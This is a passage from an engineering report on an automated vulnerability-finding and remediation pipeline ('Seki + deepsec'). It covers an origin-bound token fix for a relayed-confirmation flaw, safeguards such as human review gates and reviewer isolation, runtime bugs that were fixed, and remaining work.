Once the pipeline could carry it (see hardening below), Seki's remediation
authored the **full root-cause fix**:

- a **server-derived, origin-bound confirmation token** (an HMAC over the
  challenge identifier and the browser-binding nonce) that gates the sensitive
  completion step — so a relayed confirmation can no longer authenticate a
  session it did not initiate;
- a **failing-then-passing regression test**.

A genuine multi-file, cross-stack security fix *with a test* — not a line-level
patch. This is the core demonstration: the tool finds a hard, subtle flaw and
remediates it at the root, or defers it cleanly when it cannot do so properly.

### Pipeline discipline (precision + safety)

- **Adversarial N-vote**: the "disprove" revalidation rejected the large
  majority of raw scanner candidates; only a minority were confirmed. High
  precision against scanner noise.
- **Hard-stops**: crypto/secrets findings are never auto-patched — routed to
  human review by design.
- **Reviewer isolation**: the final reviewer judge sees only a four-field
  projection `{file, line, category, diff}` — never the scanner prose or
  exploit narrative — a deliberate prompt-injection barrier.
- **Human gate**: the run pauses before any merge; nothing lands unattended.

## Engineering hardening (bugs found + fixed)

Driving real runs surfaced and fixed six runtime issues (all merged to `main`):

| Area | Issue | Fix |
|---|---|---|
| Remediation loop | the per-run "attempted" ledger, relayed through a `compute` and rendered as Go `%v`, was rejected by the JSON parser → the loop re-picked the same finding forever | parse the ledger leniently; then carry it as a **comma-separated string** (a multi-element `%v` with spaces also broke the tool's shell, exit 127) — shell-safe and parse-safe |
| deepsec resilience | the deepsec step lost its **entire** contribution on a transient blip, and **hung indefinitely** on a mid-run network loss (its SDK does not self-recover) | retry the process once + bound it with a **timeout** so a hang is killed and auto-retried |
| Budget | a hardcoded duration/iteration budget capped audit+remediation on a large repo | env-configurable, raised defaults |
| Project toolchain | build/test rungs run in the **project's own pinned toolchain** (devbox); the persistent Nix store is default-on so they run warm | sandbox driver + bot rungs |
| Skill resolution | remediation prompts pointed at a skill path not reliably present in the worktree | point at the always-mounted run bundle |

## Known remaining work (verdict quality)

Reaching the gate surfaced a remaining tail that currently keeps confirmed
findings at **`uncertain`** (proposed) rather than **`verified`**
(auto-committed). None of these block the pipeline — it reaches the human gate
— but they gate the verified-auto-apply outcome:

- the reviewer-isolation **projection compute** does not substitute its inputs
  (nested output access in a `compute` expr), so the reviewer receives
  placeholders and fail-closes;
- the **reproduce** rung occasionally still fires after a valid fix
  (calibration);
- the gate **summary under-counts** the proposed artifacts.

Scoped as the next focused task — verdict-quality polish, not capability.

## Conclusion

Seki + deepsec is validated: it finds relevant, subtle vulnerabilities that
signature scanners miss, and it authors complete, tested, root-cause fixes —
including a design-level fix it deferred until it could do it properly — while
running the whole pipeline to a human approval gate with adversarial
revalidation, hard-stops, and reviewer isolation. The open items are
verdict-quality polish.
